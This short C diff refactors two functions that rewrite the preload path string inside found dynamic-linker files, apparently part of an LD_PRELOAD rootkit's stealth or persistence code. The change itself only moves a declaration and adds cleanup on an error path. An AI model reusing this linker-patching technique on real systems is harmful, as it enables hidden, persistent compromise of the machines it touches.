@@ -8,14 +8,13 @@ int _ispatched(const char *path, const char *newpreload){
     FILE *ofp;
     off_t fsize;
     size_t n, plen=strlen(newpreload);
+    int count=0;
 
     hook(CFOPEN, CFWRITE);
 
     ofp = call(CFOPEN, path, "rb");
     if(ofp == NULL) return -1;
     fsize = getfilesize(path)/2;
-
-    int count = 0;
 
     do{
         buf = malloc(fsize+1);
@@ -148,13 +147,14 @@ int ldpatch(const char *oldpreload, const char *newpreload){
         return -3;
 
     for(int i=0; i<allf; i++){
-        p=_ldpatch(foundld[i], oldpreload, newpreload);
-
+        p = _ldpatch(foundld[i], oldpreload, newpreload);
         free(foundld[i]);
         foundld[i] = NULL;
 
-        if(p<0) return p;
-        if(p) c++;
+        if(p<0){
+            free(foundld);
+            return p;
+        }else if(p) c++;
     }
 
     free(foundld);
